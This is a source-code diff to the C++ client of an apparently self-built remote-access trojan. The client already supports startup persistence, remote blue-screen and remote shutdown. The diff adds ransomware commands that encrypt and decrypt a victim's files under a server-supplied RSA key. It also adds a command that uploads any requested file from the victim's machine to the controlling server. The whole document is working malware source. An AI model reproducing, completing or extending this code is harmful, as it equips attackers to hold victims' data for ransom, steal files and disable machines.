@@ -1,6 +1,7 @@
 #include "Client.h"
 #include "NetworkManager.h"
 #include "Syscalls.h"
+#include "openssl/err.h"
 
 #define ADD_TO_STARTUP TRUE
 
@@ -201,30 +202,74 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
     return description;
 }
 
-BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
+bool Client::PerformCommand(const Packet& command, Packet& outResponse) {
 
-    BOOL    success     = FALSE;
+    bool    success     = false;
     CMDDESC description = CreateCommandDescription(command);
     std::string cmdOutput = "";
 
     switch ( command.action ) {
+    case Action::kReceiveFileFromClient: {
+        // path of file to download in buffer
+        std::string downloadPath(command.buffer, command.buffLen);
+        File file(downloadPath);
+        success = this->m_NetworkManager.SendFile(file, this->m_TCPSocket, this->GetAESKey());
+        break;
+    }
+    case Action::kSetAsDecryptionKey: {
+        int len = 0;
+
+        int received = Receive(this->m_TCPSocket, ( char* ) &len, sizeof(len), 0);
+        if ( received <= 0 )
+            break;
+
+        unsigned char* der = ( unsigned char* ) malloc(len);
+        received = Receive(this->m_TCPSocket, ( char* ) der, len, 0);
+        if ( received <= 0 ) {
+            free(der);
+            break;
+        }
+
+        const unsigned char* constDer = der;
+
+        RSA* key = d2i_RSAPrivateKey(nullptr, &constDer, len);
+        if ( !key ) {
+            free(der);
+            break;
+        }
+
+        this->m_FileManager.SetPrivateKey(key);
+
+        success = true;
+        break;
+    }
+    case Action::kRunDecryptor:
+        // its still called even if we havent received the private key from the server 
+        // wont decrypt anything though because we dont have the private key
+        this->m_FileManager.TransformFiles(command.buffer, &FileManager::DecryptContents, this->m_FileManager);
+        success = true;
+        break;
+    case Action::kRansomwareEnable:
+        this->m_FileManager.TransformFiles(command.buffer, &FileManager::EncryptContents, this->m_FileManager);
+        success = true;
+        break;
     case Action::kAddToStartup:
         this->m_ProcMgr.AddProcessToStartup(command.buffer);
-        success = TRUE;
+        success = true;
         break;
     case Action::kPingClient:
-        success = TRUE;
+        success = true;
         break;
     case Action::kRemoteBSOD:
         this->m_ProcMgr.BSOD();
         break;
     case Action::kRemoteShutdown: {
-        CLIENT_DBG(command.buffer);
         if ( strcmp(command.buffer, "shutdown") == 0 )
             ProcessManager::ShutdownSystem(ShutdownPowerOff);
         else if ( strcmp(command.buffer, "restart") == 0 )
             ProcessManager::ShutdownSystem(ShutdownReboot);
 
+        success = true;
         break;
     }
     case Action::kOpenRemoteProcess:
@@ -241,11 +286,14 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         );
         
         break;
+    default:
+        success = true;
+        break;
     }
 
     if ( description.respondToServer || command.flags & RESPOND_WITH_STATUS ) {
         outResponse.action = command.action;
-        outResponse.code = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
+        outResponse.code = (success) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
         outResponse.insert(cmdOutput);
     }
 
@@ -327,6 +375,46 @@ bool Client::ExchangeCryptoKeys() {
     if ( derClientPubKeyLen < 0 )
         return false;
 
+    const unsigned char* constDerServerPubKey = derServerPubKey;
+
+    // convert unsigned char* der rsa key to RSA* object
+    RSA* rsaServerPubKey = d2i_RSAPublicKey(nullptr, &constDerServerPubKey, derServerPubKeyLen);
+    if ( !rsaServerPubKey ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    this->m_ServerPublicKey = rsaServerPubKey;
+
+    // receive ransom rsa public key
+    int ransomRSAKeyLen = 0;
+    received = Receive(this->m_TCPSocket, ( char* ) &ransomRSAKeyLen, sizeof(ransomRSAKeyLen), 0);
+    if ( received <= 0 ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    unsigned char* derRansomRSAKey = (unsigned char*)malloc(ransomRSAKeyLen);
+    received = Receive(this->m_TCPSocket, ( char* )derRansomRSAKey, ransomRSAKeyLen, 0);
+    if ( received <= 0 ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    const unsigned char* constDerRansomRSAKey = derRansomRSAKey;
+
+    RSA* rsaRansomKey = d2i_RSAPublicKey(nullptr, &constDerRansomRSAKey, ransomRSAKeyLen);
+    if ( !rsaRansomKey ) {
+        free(derClientPubKey);
+        free(derServerPubKey);
+        return false;
+    }
+
+    this->m_RansomSecrets.pub = rsaRansomKey;
+    this->m_FileManager.SetPublicKey(this->m_RansomSecrets.pub);
 
     // convert RSA* to unsigned char*, this function already mallocs 
     // derClientPubKey for us
@@ -345,18 +433,6 @@ bool Client::ExchangeCryptoKeys() {
         free(derClientPubKey);
         return false;
     }
-
-    const unsigned char* constDerServerPubKey = derServerPubKey;
-    
-    // convert unsigned char* der rsa key to RSA* object
-    RSA* rsaServerPubKey = d2i_RSAPublicKey(nullptr, &constDerServerPubKey, derServerPubKeyLen );
-    if ( !rsaServerPubKey ) {
-        free(derClientPubKey);
-        free(derServerPubKey);
-        return false;
-    }
-
-    this->m_ServerPublicKey = rsaServerPubKey;
     
     // get the aes key generated for this client on the server
     BYTESTRING encryptedEncodedAES;
